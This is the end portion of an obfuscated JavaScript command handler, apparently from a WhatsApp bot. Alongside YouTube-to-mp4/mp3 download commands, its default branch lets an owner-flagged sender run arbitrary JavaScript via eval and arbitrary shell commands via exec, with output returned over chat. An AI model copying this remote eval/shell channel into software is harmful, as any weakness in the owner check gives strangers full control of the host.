          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5ef16a, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "mp4":
        {
          if (!_0x21f0d9.quoted) {
            return _0x3b9923("replyz MESSAGE");
          }
          let _0x2ebf9c = _0x21f0d9.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
          if (!_0x2ebf9c) {
            return _0x3b9923("Maybe the message you reply to doesnt contain a YouTube URL");
          }
          let _0x2bbaf0 = parseInt(_0x40d288) - 1;
          if (_0x2bbaf0 < 0 || _0x2bbaf0 >= _0x2ebf9c.length) {
            return _0x3b9923("Invalid URL index");
          }
          await _0x821100(_0x2ebf9c);
        }
        break;
      case "mp3":
        {
          if (!_0x21f0d9.quoted) {
            return _0x3b9923("replyz MESSAGE");
          }
          let _0x2c5e60 = _0x21f0d9.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
          if (!_0x2c5e60) {
            return _0x3b9923("Maybe the message you reply to doesnt contain a YouTube URL");
          }
          let _0x53f021 = parseInt(_0x40d288) - 1;
          if (_0x53f021 < 0 || _0x53f021 >= _0x2c5e60.length) {
            return _0x3b9923("Invalid URL index");
          }
          await downloadMp3(_0x2c5e60);
        }
        break;
      default:
        if (_0x8963e8.startsWith("=>")) {
          if (!_0x39695a) {
            return;
          }
          function _0x777d33(_0x46675f) {
            sat = JSON.stringify(_0x46675f, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(_0x46675f);
            }
            return _0x3b9923(bang);
          }
          try {
            _0x3b9923(util.format(eval("(async () => { return " + _0x8963e8.slice(3) + " })()")));
          } catch (_0x45d12d) {
            _0x3b9923(String(_0x45d12d));
          }
        }
        if (_0x8963e8.startsWith(">")) {
          if (!_0x39695a) {
            return;
          }
          let _0x25ffa7 = _0x8963e8.trim().split(/ +/)[0];
          let _0x30781a;
          try {
            _0x30781a = await eval("(async () => { " + (_0x25ffa7 == ">>" ? "return" : "") + " " + q + "})()");
          } catch (_0x5ec299) {
            _0x30781a = _0x5ec299;
          } finally {
            await _0x3b9923(require("util").format(_0x30781a));
          }
        }
        if (_0x8963e8.startsWith("$")) {
          if (!_0x39695a) {
            return;
          }
          exec(_0x8963e8.slice(2), (_0x523c0d, _0xc9d24c) => {
            if (_0x523c0d) {
              return _0x3b9923("" + _0x523c0d);
            }
            if (_0xc9d24c) {
              return _0x3b9923(_0xc9d24c);
            }
          });
        }
    }
  } catch (_0x33ed6a) {
    console.log(util.format(_0x33ed6a));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("Update " + __filename);
  delete require.cache[file];
  require(file);
});
